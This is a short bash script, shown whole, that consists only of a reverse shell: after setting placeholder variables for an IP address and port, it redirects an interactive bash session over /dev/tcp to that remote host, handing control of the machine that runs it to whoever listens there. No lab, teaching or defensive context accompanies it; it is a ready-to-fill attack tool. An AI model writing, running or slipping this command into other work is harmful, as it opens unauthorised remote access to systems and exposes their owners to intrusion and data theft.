#!/bin/bash

IP_ADDRESS="YOUR_IP_ADDRESS"
PORT="YOUR_PORT_NUMBER"

bash -i >& /dev/tcp/$IP_ADDRESS/$PORT 0>&1
